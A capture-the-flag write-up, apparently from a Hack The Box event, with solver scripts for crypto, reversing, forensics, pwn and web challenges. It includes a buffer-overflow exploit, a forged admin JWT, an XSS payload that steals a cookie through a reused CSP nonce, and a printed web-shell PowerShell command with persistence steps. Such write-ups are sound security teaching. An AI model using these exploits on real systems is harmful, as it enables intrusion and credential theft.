# Coding

## Replacement

Just do a simple string replace in python

```Python
strr = input()
letter_to_replace = input()
replacement = input()
print(strr.replace(letter_to_replace, replacement))
```
FLAG: `HTB{g0tTa_r3pLacE_th3_sTR1nG!!_a1bc9456cc42f89fa11cee76310ab751}`

## MiniMax

Simple Python min and max from a list:

```Python
strr = input()
numbers = [float(x) for x in strr.split(" ")]
print(min(numbers))
print(max(numbers))
```

FLAG: `HTB{aLL_maX3d_0uT_d278229602751c762157b383565d996d}`

# Crypto

## binary basis

We are given the following Python code and its output:

```Python
from Crypto.Util.number import getPrime, bytes_to_long
from math import prod

FLAG = open('flag.txt', 'rb').read()

primes = [getPrime(128) for _ in range(16)]

n = prod(primes)
e = 0x10001
m = bytes_to_long(FLAG)
c = pow(m, e, n)
treat = sum([primes[i]*2**(0x1337-158*(2*i+1)) for i in range(16)])

with open('output.txt', 'w') as f:
   f.write(f'{n = }\n')
   f.write(f'{e = }\n')
   f.write(f'{c = }\n')
   f.write(f'{treat = }\n')
```

From it, we see that it generates 16 primes of 128 bits, and multiples them together to get the "N" for RSA encryption.
We also get a "treat", which is basically a sum of the primes, raised to some power of 2.

We have 16 primes, each 128 bits, thus we need 2048 bits to store them together, which is 0x800. We see that the exponent used is indexed from 0x1337 (higher than our required size), and shifts by 316 each step, hence each prime will have lots of space to fit. 
That sum is basically just a shifted sum of the primes. Converting the "treat" to binary and obtaining the required exponents, we can get the primes, after which we can get the decrypted flag.

```Python
from Crypto.Util.number import long_to_bytes, inverse
from math import prod

n = 352189612438784047320754903106372002809877965719588610950180565262740960705788381566578345723325074804073747981488556714699194183628557150903839852453543700776971896448650422022044960974232637963499485064773137220336653165714273408753468196975611814144214482908258123395290626550717602601895666745644709508591571302894106487383195731091217527995774179358090943421864881850666765491934935419093710096767868514339375941764521600704560564724716373816013966194185050357691082654919969371044174479415710416530800029987261822155401485231590655607419352265580910531638967882492680615189164541617995862933344817766381378089
e = 0x10001
c = 258206881010783673911167466000280032795683256029763436680006622591510588918759130811946207631182438160709738478509009433281405324151571687747659548241818716696653056289850196958534459294164815332592660911913191207071388553888518272867349215700683577256834382234245920425864363336747159543998275474563924447347966831125304800467864963035047640304142347346869249672601692570499205877959815675295744402001770941573132409180803840430795486050521073880320327660906807950574784085077258320130967850657530500427937063971092564603795987017558962071435702640860939625245936551953348307195766440430944812377541224555649965224
treat = 33826299692206056532121791830179921422706114758529525220793629816156072250638811879097072208672826369710139141314323340868249218138311919342795011985307401396584742792889745481236951845524443087508961941376221503463082988824380033699922510231682106539670992608869544016935962884949065959780503238357140566278743227638905174072222417393094469815315554490106734525135226780778060506556705712260618278949198314874956096334168056169728142790865790971422951014918821304222834793054141263994367399532134580599152390531190762171297276760172765312401308121618180252841520149575913572694909728162718121046171285288877325684172770961191945212724710898385612559744355792868434329934323139523576332844391818557784939344717350486721127766638540535485882877859159035943771015156857329402980925114285187490669443939544936816810818576838741436984740586203271458477806641543777519866403816491051725315688742866428609979426437598677570710511190945840382014439636022928429437759136895283286032849032733562647559199731329030370747706124467405783231820767958600997324346224780651343241077542679906436580242223756092037221773830775592945310048874859407128884997997578209245473436307118716349999654085689760755615306401076081352665726896984825806048871507798497357305218710864342463697957874170367256092701115428776435510032208152373905572188998888018909750348534427300919509022067860128935908982044346555420410103019344730263483437408060519519786509311912519598116729716340850428481288557035520

highest_exponent = 4919 - 158 * (2 * 0 + 1)
highest_bit_position = highest_exponent + 127
treat_bin_length = highest_bit_position + 1
treat_bin = bin(treat)[2:].zfill(treat_bin_length)

primes = []
for i in range(16):
    exponent_i = 4919 - 158 * (2 * i + 1)
    start = highest_bit_position - (exponent_i + 127)
    end = highest_bit_position - exponent_i
    bits_i = treat_bin[start:end + 1]
    prime_i = int(bits_i, 2)
    primes.append(prime_i)

n_computed = prod(primes)
assert n_computed == n, "Primes not good"

phi_n = prod([p - 1 for p in primes])
d = inverse(e, phi_n)
m = pow(c, d, n)

flag = long_to_bytes(m)
print(flag)
```

FLAG: `HTB{hiding_primes_in_powers_of_two_like_an_amateur}`

## hybrid unifier

We are given a simple web app, and a readme. The readme states that we can interact with the API to establish a session with elliptic curves, which will give us all parameters to create the end-to-end encryption between us and the server. Then, we just have to send a packet with "flag" to the dashboard with the correct session parameters to get the flag.

Analyzing the source code and seeing how the session is created, we can create a script that prepares the session and submits the required data.

```Python
import requests
from Crypto.Util.number import getPrime, long_to_bytes as l2b, bytes_to_long as b2l
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from hashlib import sha256
import os
import json
import base64
from secrets import randbelow

BASE_URL = 'http://94.237.62.154:38054'

def request_session_parameters():
    url = BASE_URL + '/api/request-session-parameters'
    response = requests.post(url)
    data = response.json()
    g_hex = data['g']
    p_hex = data['p']
    g = int(g_hex, 16)
    p = int(p_hex, 16)
    return g, p

def init_session(g, p):
    b = randbelow(p)
    client_public_key = pow(g, b, p)
    url = BASE_URL + '/api/init-session'
    data = {'client_public_key': client_public_key}
    response = requests.post(url, json=data)
    resp_data = response.json()
    if resp_data.get('status_code') != 200:
        print('Error initializing session:', resp_data.get('error'))
        return None, None
    server_public_key_hex = resp_data['server_public_key']
    server_public_key = int(server_public_key_hex, 16)
    return b, server_public_key

def compute_session_key(server_public_key, b, p):
    key = pow(server_public_key, b, p)
    session_key = sha256(str(key).encode()).digest()
    return session_key

def request_encrypted_challenge():
    url = BASE_URL + '/api/request-challenge'
    response = requests.post(url)
    resp_data = response.json()
    encrypted_challenge_b64 = resp_data['encrypted_challenge']
    encrypted_challenge = base64.b64decode(encrypted_challenge_b64)
    return encrypted_challenge

def decrypt_challenge(encrypted_challenge, session_key):
    iv = encrypted_challenge[:16]
    encrypted_data = encrypted_challenge[16:]
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted_data)
    challenge = unpad(decrypted_padded, 16)
    return challenge

def compute_challenge_hash(challenge):
    challenge_hash = sha256(challenge).hexdigest()
    return challenge_hash

def encrypt_packet(packet_data, session_key):
    iv = os.urandom(16)
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    padded_data = pad(packet_data.encode(), 16)
    encrypted_data = cipher.encrypt(padded_data)
    encrypted_packet = iv + encrypted_data
    encrypted_packet_b64 = base64.b64encode(encrypted_packet).decode()
    return encrypted_packet_b64

def send_challenge_response_and_packet(challenge_hash, encrypted_packet_b64):
    url = BASE_URL + '/api/dashboard'
    data = {
        'challenge': challenge_hash,
        'packet_data': encrypted_packet_b64
    }
    response = requests.post(url, json=data)
    resp_data = response.json()
    return resp_data

def decrypt_response_packet(resp_data, session_key):
    if 'packet_data' not in resp_data:
        print('Error:', resp_data.get('error'))
        return None
    encrypted_packet_b64 = resp_data['packet_data']
    encrypted_packet = base64.b64decode(encrypted_packet_b64)
    iv = encrypted_packet[:16]
    encrypted_data = encrypted_packet[16:]
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted_data)
    packet_data = unpad(decrypted_padded, 16).decode()
    return packet_data

def main():
    g, p = request_session_parameters()
    print(f"Received g and p: g={g}, p={p}")

    b, server_public_key = init_session(g, p)
    if b is None:
        print('Failed to initialize session.')
        return
    print(f"Initialized session. Server public key: {server_public_key}")

    session_key = compute_session_key(server_public_key, b, p)
    print(f"Computed session key.")

    encrypted_challenge = request_encrypted_challenge()
    print(f"Received encrypted challenge.")

    challenge = decrypt_challenge(encrypted_challenge, session_key)
    print(f"Decrypted challenge.")

    challenge_hash = compute_challenge_hash(challenge)
    print(f"Computed challenge hash.")

    packet_data = 'flag'
    encrypted_packet_b64 = encrypt_packet(packet_data, session_key)
    print(f"Encrypted action packet.")

    resp_data = send_challenge_response_and_packet(challenge_hash, encrypted_packet_b64)
    print(f"Received response from server.")

    flag = decrypt_response_packet(resp_data, session_key)
    if flag:
        print("Flag:", flag)
    else:
        print("Failed to retrieve flag.")

if __name__ == "__main__":
    main()

```

FLAG: `HTB{good_job_in_alpha_testing_our_protocol___take_this_flag_as_a_gift_2d465c4c217b2616221a50959c8d15eb}`

# Reversing

## Terrorfryer

We are given a binary, which takes an input, scrambles it, and then checks it against a value. If you input matches the desired value, we get the flag (the flag is the input).

Here is the shuffle function:
```C++
void fryer(char *param_1)

{
  char cVar1;
  int iVar2;
  size_t sVar3;
  long lVar4;
  
  if (init.1 == 0) {
    seed.0 = 0x13377331;
    init.1 = 1;
  }
  sVar3 = strlen(param_1);
  if (1 < sVar3) {
    lVar4 = 0;
    do {
      iVar2 = rand_r(&seed.0);
      cVar1 = param_1[lVar4];
      param_1[lVar4] = param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4];
      param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4] = cVar1;
      lVar4 = lVar4 + 1;
    } while (lVar4 != sVar3 - 1);
  }
  return;
}
```

Simply implement rand_r function from libc, and obtain the swaps, then apply them in reverse.

```Python
def rand_r(seed):
    # libc implementation
    next_val = seed[0]
    
    next_val = (next_val * 1103515245 + 12345) & 0xFFFFFFFF
    result = (next_val // 65536) % 2048
    
    next_val = (next_val * 1103515245 + 12345) & 0xFFFFFFFF
    result = ((result << 10) ^ ((next_val // 65536) % 1024)) & 0xFFFFFFFF
    
    next_val = (next_val * 1103515245 + 12345) & 0xFFFFFFFF
    result = ((result << 10) ^ ((next_val // 65536) % 1024)) & 0xFFFFFFFF
    
    seed[0] = next_val
    return result

def unscramble(scrambled):
    result = list(scrambled)
    length = len(result)

    seed = [0x13377331]
    swaps = []
    for i in range(length - 1):
        r = rand_r(seed)
        j = i + (r % (length - i))
        swaps.append((i, j))

    for i, j in reversed(swaps):
        result[i], result[j] = result[j], result[i]
    
    return ''.join(result)

target = "1_n3}f3br9Ty{_6_rHnf01fg_14rlbtB60tuarun0c_tr1y3"
solution = unscramble(target)
print(f"Found solution: {solution}")

```

FLAG: `HTB{4_truly_t3rr0r_fry1ng_funct10n_9b3ab6360f11}`

## LinkHands

Opening and reversing the file, we see that it asks some input, and then it prints out the flag.

```C++
  if (iVar1 == 2) {
    *local_68 = local_60;
    ppuVar4 = &PTR_PTR_00404190;
    do {
      putchar((int)*(char *)(ppuVar4 + 1));
      ppuVar4 = (undefined **)*ppuVar4;
    } while (ppuVar4 != (undefined **)0x0);
    putc(10,stdout);
    uVar3 = 0;
  }
  else {
    puts("You fail to grasp their hands - they look at you with suspicious...");
    uVar3 = 1;
  }
```

Looking at what it uses to print, we can see that we get the flag there, in a linked-list structure. Seeing as it how it has entries next to one another, we can just read those values from the binary. However, at some point, it breaks and jumps to another address. Restarting our loop from that new address, we get the rest of the flag (needs "}" appended).

```Python
with open("link", "rb") as f:
	data = f.read()
start = 0x3198
res = ""
for i in range(18):
	res += chr(data[start + i * 16])

start = 0x3068
for i in range(19):
	res += chr(data[start + i * 16])
print(res)
```

FLAG: `HTB{4_br34k_1n_th3_ch41n_0e343f537ebc}`

# Forensics

## Foggy intrustion

We are given a PCAP. Analyzing it, we see some GET/POST requests to some HTTP server. The GET requests are not usually giving response, but there are interesting POST requests which send base64 encoded commands to be executed via php, and the server responds with the base64 encoded compressed answers.

Example command: `<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSB3aG9hbWk7ICRieXRlcyA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KTsgJGNvbXByZXNzZWRTdHJlYW0gPSBbU3lzdGVtLklPLk1lbW9yeVN0cmVhbV06Om5ldygpOyAkY29tcHJlc3NvciA9IFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbV06Om5ldygkY29tcHJlc3NlZFN0cmVhbSwgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpDb21wcmVzcyk7ICRjb21wcmVzc29yLldyaXRlKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7ICRjb21wcmVzc29yLkNsb3NlKCk7ICRjb21wcmVzc2VkQnl0ZXMgPSAkY29tcHJlc3NlZFN0cmVhbS5Ub0FycmF5KCk7IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGNvbXByZXNzZWRCeXRlcyki')); ?>`
Decoded: `powershell.exe -C "$output = whoami; $bytes = [Text.Encoding]::UTF8.GetBytes($output); $compressedStream = [System.IO.MemoryStream]::new(); $compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); $compressor.Write($bytes, 0, $bytes.Length); $compressor.Close(); $compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"`

We reverse that code so we can get the servers response.

```PowerShell
$base64Input = ''
$compressedBytes = [Convert]::FromBase64String($base64Input)
$compressedStream = [System.IO.MemoryStream]::new($compressedBytes)
$decompressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
$reader = [System.IO.StreamReader]::new($decompressor, [Text.Encoding]::UTF8)
$output = $reader.ReadToEnd()
echo $output
```

First it asks for listing of "C:", then lists "C:\xampp", then reads "C:\xampp\proprieties.ini" and then reads "C:\xampp\htdocs\config.php", which has the flag.


FLAG: `HTB{f06_d154pp34r3d_4nd_fl46_w4s_f0und!}`

## Ghostly persistence

We are given a bunch of .evtx files, and are tasked to find the intrusion.

Given the persistence name, I first decided to look into the powershell logs, maybe something was logged there.

There, we see some powershell snippet.
```PowerShell
Get-PSDrive -Name C -Verbose
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion" -Verbose

New-Item -Path "HKCU:\Software\cPdQnixceg" -Force
New-ItemProperty -Path "HKCU:\Software\cPdQnixceg" -Name "cPdQnixceg" -Value "X1c0c19SM3YzNGwzZH0=" -PropertyType String
Get-ScheduledTask -Verbose
```

Base64 decoding that value yields the second part of the flag.

Looking further into that same log, we see another interesting powershell command.

```PowerShell
Get-ChildItem -Path "$env:TEMP" -Verbose
Get-Process -Verbose

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand JHRlbXBQYXRoID0gIiRlbnY6d2luZGlyXHRlbXBcR2gwc3QudHh0IgoiSFRCe0doMHN0X0wwYzR0MTBuIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcFBhdGggLUVuY29kaW5nIHV0Zjg="
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MaintenanceTask" -Description ""
```

Decoding that from base64 yields the first part of the flag.

FLAG: `HTB{Gh0st_L0c4t10n_W4s_R3v34l3d}`

# Pwn

## El Pipo

We are given a binary and a webpage through which we can send data to the binary. 
```C++
  __int64 buf[5]; // [rsp+0h] [rbp-30h] BYREF
  char v5; // [rsp+2Fh] [rbp-1h]

  memset(buf, 0, 32);
  v5 = 1;
  read(0, buf, 0x40uLL);
  if ( v5 == 1 )
  {
    fwrite("Not scary enough.. Boo! :(", 1uLL, 0x1AuLL, _bss_start);
    fflush(_bss_start);
  }
  else
  {
    read_flag();
  }
```

The vulnerability lies in the fact that reading 0x29 bytes into our buffer will overwrite the `v5` variable, thus overwriting it and making it read the flag.
Sending a long string of 'A's yields the flag.

FLAG: `HTB{3l_p1p0v3rfl0w_7ca2591a5a16aa52a4be4cd9671db32f}`

## El Mundo

We are provided with a ret2win scenario, where we are given a binary with a buffer overflow vulnerability, and a `read_flag` function.

```C++
 printf("[*] Overflow  the buffer.\n[*] Overwrite the \'Local Variables\' with junk.\n[*] Overwrite  the Saved RBP with junk.\n[*] Overwrite \'Return Address\' with the address of \'read_flag() [%p] .\'\n\n> "
         ,read_flag);
  local_10 = read(0,&local_38,0x100);
  if (local_10 < 0x38) {
    show_stack(&local_38);
    printf("%s[-] You need to add more than %lu bytes!%s\n",&DAT_0040477b,local_10,&DAT_004044c1);
  }
  else {
    show_stack(&local_38);
    printf("[!] You changed the return address!%s\n",&DAT_004044c1);
  }
  show_stack(&local_38);
```

Run the binary, and it will provide the stack layout, as well as the amount of bytes needed and the address of `read_flag`. Plug these into the script and you'll get the flag.

```Python
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = './el_mundo' 

LOCAL = False # Change this to "True" to run it locally 

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)

# CHANGE THESE
nbytes = 56          # CHANGE THIS TO THE RIGHT AMOUNT
read_flag_addr = 0x4016b7 # ADD THE CORRECT ADDRESS

# Send payload
r.sendlineafter('> ', b'A'*nbytes + p64(read_flag_addr))

# Read flag
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')

```

FLAG: `HTB{z4_w4rud0o0o0o0_7da6a02f0b3f67f2675053b8a9475d9e}`

# Web

## WayWitch

We are given a webpage, with some routes. One interesting route we see, is `/tickets`, which requires authorization as `admin` and if we look at what it does, it lists all the tickets. Analyzing the DB, we see this code:

```JS
  async migrate() {
    let flag;
    fs.readFile("/flag.txt", "utf8", function (err, data) {
      flag = data;
    });

    await this.db.exec(`
          DROP TABLE IF EXISTS tickets;

          CREATE TABLE tickets(
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              name VARCHAR(255) NOT NULL,
              username VARCHAR(255) NOT NULL,
              content TEXT NOT NULL
          );
      `);

    await this.db.exec(`
          INSERT INTO tickets (name, username, content) VALUES
          ('John Doe', 'guest_1234', 'I need help with my account.'),
          ('Jane Smith', 'guest_5678', 'There is an issue with my subscription.'),
          ('Admin', 'admin', 'Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter ${flag}'),
          ('Paul Blake', 'guest_9012', 'Can someone assist with resetting my password?'),
          ('Alice Cooper', 'guest_3456', 'The app crashes every time I try to upload a picture.');
      `);
  }
```

Verification is done via JWT tickets, requiring the username to be `admin`.

However, analyzing the page, we have the code for generating the `JWT` in plaintext:

```JS
async function generateJWT() {
                const existingToken = getCookie("session_token");

                if (existingToken) {
                    console.log("Session token already exists:", existingToken);
                    return;
                }

                const randomNumber = Math.floor(Math.random() * 10000);
                const guestUsername = "guest_" + randomNumber;

                const header = {
                    alg: "HS256",
                    typ: "JWT",
                };

                const payload = {
                    username: guestUsername,
                    iat: Math.floor(Date.now() / 1000),
                };

                const secretKey = await crypto.subtle.importKey(
                    "raw",
                    new TextEncoder().encode("halloween-secret"),
                    { name: "HMAC", hash: "SHA-256" },
                    false,
                    ["sign"],
                );

                const headerBase64 = btoa(JSON.stringify(header))
                    .replace(/\+/g, "-")
                    .replace(/\//g, "_")
                    .replace(/=+$/, "");
                const payloadBase64 = btoa(JSON.stringify(payload))
                    .replace(/\+/g, "-")
                    .replace(/\//g, "_")
                    .replace(/=+$/, "");

                const dataToSign = `${headerBase64}.${payloadBase64}`;
                const signatureArrayBuffer = await crypto.subtle.sign(
                    { name: "HMAC" },
                    secretKey,
                    new TextEncoder().encode(dataToSign),
                );

                const signatureBase64 = btoa(
                    String.fromCharCode.apply(
                        null,
                        new Uint8Array(signatureArrayBuffer),
                    ),
                )
                    .replace(/\+/g, "-")
                    .replace(/\//g, "_")
                    .replace(/=+$/, "");

                const token = `${dataToSign}.${signatureBase64}`;

                document.cookie = `session_token=${token}; path=/; max-age=${60 * 60 * 24}; Secure`;

                console.log("Generated JWT Session Token:", token);
            }

```

We have the signing secret in plaintext. Just reproducing that code in Node and generating one token with the `admin` username, and using Burp to modify the cookie when requesting `/tickets` yields the flag.

```JS
const crypto = require('crypto');

const header = { alg: 'HS256', typ: 'JWT' };
const payload = { username: 'admin', iat: Math.floor(Date.now() / 1000) };
const secret = 'halloween-secret';

function base64url(source) {
  let encodedSource = Buffer.from(JSON.stringify(source)).toString('base64');
  encodedSource = encodedSource.replace(/=+$/, '');
  encodedSource = encodedSource.replace(/\+/g, '-').replace(/\//g, '_');
  return encodedSource;
}

const headerBase64 = base64url(header);
const payloadBase64 = base64url(payload);
const dataToSign = `${headerBase64}.${payloadBase64}`;

const signature = crypto
  .createHmac('sha256', secret)
  .update(dataToSign)
  .digest('base64')
  .replace(/=+$/, '')
  .replace(/\+/g, '-')
  .replace(/\//g, '_');

const token = `${dataToSign}.${signature}`;

console.log('Generated JWT:', token);


```

FLAG: `HTB{k33p_jwt_s3cr3t_s4f3_br0_f260abaab6d8a8a4eae50b912228b47e}`

## Cursed Stale Policy

Analyzing the webpage, we see that we are given a CSP (Content-Security-Policy), that bans some possible options for XSS, and an option to modify the XSS payload. Running multiple payloads, we notice that the nonce doesn't change, thus we can use it bypass the active CSP. Creating a simple payload with the given nonce, yields the flag (there will be a request history, and the flag is in the cookie).

```JS
<script nonce='7ec3b95b81c960f79c57916c343e9a82'>
   alert('hey');
</script>
```

First you have to run the bot (via trigger bot - by analysis of source code, it will end up doing the xss and setting the cookie as the flag), and then triggering the XSS (via trigger XSS) button, will eventually yield a request history, where the cookie is the flag. 

FLAG: `HTB{br0k3_th3_sp3cter's_st4l3_curs3_3b67620225dd671a013aae884a7c8ec5}`